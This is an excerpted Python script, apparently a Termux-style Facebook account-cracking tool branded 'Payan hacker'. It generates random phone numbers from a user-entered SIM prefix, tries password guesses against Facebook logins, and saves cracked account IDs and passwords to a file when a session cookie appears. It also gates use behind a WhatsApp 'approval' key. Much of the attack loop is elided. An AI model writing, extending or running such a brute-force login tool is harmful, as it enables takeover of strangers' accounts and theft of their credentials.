...
os.system('xdg-open https://chat.whatsapp.com/Fs1N6OVgYC89k3q1tNPEby')
...
logo=("""\033[1;91m _____    __     __      _   _ 
 |  __ \ /\\ \   / //\   | \ | |
 | |__) /  \\ \_/ //  \  |  \| |
 |  ___/ /\ \\   // /\ \ | . ` |
 | |  / ____ \| |/ ____ \| |\  |
 |_| /_/    \_\_/_/    \_\_| \_|
                      ...
                      PAYAN HKR
\x1b[1;92F---------------------------------------------------
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m AUTHOR     \x1b[1;97m: \x1b[1;97m Payan hacker   
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m FACEBOOK   \x1b[1;97m: \x1b[1;97m Payan hacker    
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m WHATSAPP   \x1b[1;97m: \x1b[1;97m +93774274528           
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m Khan       \x1b[1;97m: \x1b[1;97m Afghan hacker
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m Telegram   \x1b[1;97m: \x1b[1;97m Payanhacker4
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m GITHUB     \x1b[1;97m:\x1b[1;97m  Payan hacker
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m VERSION    \x1b[1;97m:\x1b[1;97m  0.1     
\x1b[1;92m----------------------------------------------------    """)
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[Payan] Example  : 070,079,078,077')
    print('\x1b[1;92m[PAYAN] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[payan] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[payan] Example  : 2000,3000,5000,10000')
    print('\x1b[1;92m[payanl] See Note : PUT LEMIT ')
    lines()
    limit = int(input('[payan] Idz Lemit : '))
    print(46*'-')
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print('[Payan] Example  : 070,078,077,****Etc')
    print('\x1b[1;92m[payan] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[payan] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[payan] Example  : 5000,100000,10000')
    print('\x1b[1;92m[payan] See Note : PUT LEMIT ')
    lines()
    limit = int(input('[Payan] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
...
def m3():
    ...
    os.system('clear')
    print(logo)
    print('[payan] Example  : 9370,9378,9377,****Etc')
    ...
    os.system('clear')
    print(logo)
    print('[Payan] Example  : 2000,3000,5000,Afghan')
    print('\x1b[1;92m[payan] See Note : PUT LEMIT ')
    lines()
    limit = int(input('[Payan] Idz Lemit : '))
    print(46*'-')
...
def b1():
    ...
    os.system('clear')
    print(logo)
    print('[payan] Example  : 0306,92***,92***,')
    print('\x1b[1;92m[+] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[payan] Your Code : ')
    lines()
    ...
    lines()
    limit = int(input('[payan] YOUR LEMIT : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Payan-OK] '+cid+' | '+ps+'\033[0;97m')
                open('Payan-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('🅷︎🅴︎🅻︎🅻︎🅾︎%20🆁︎🅾︎🅻︎🅴︎🆇︎-🅷︎🅰︎🆀︎🅰︎🅽︎🅸︎-🅽︎🅾︎🅾︎🆁︎🆉︎🅰︎🅸︎-🆂︎🅰︎🅷︎🅸︎🅱︎%20!%20🄿lease%20🄰pprove%20🄼y%20🄺ey%20🅃he%20🄺ey%20Is%20:%20'+id);os.system('am start https://wa.me/+93764034195?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
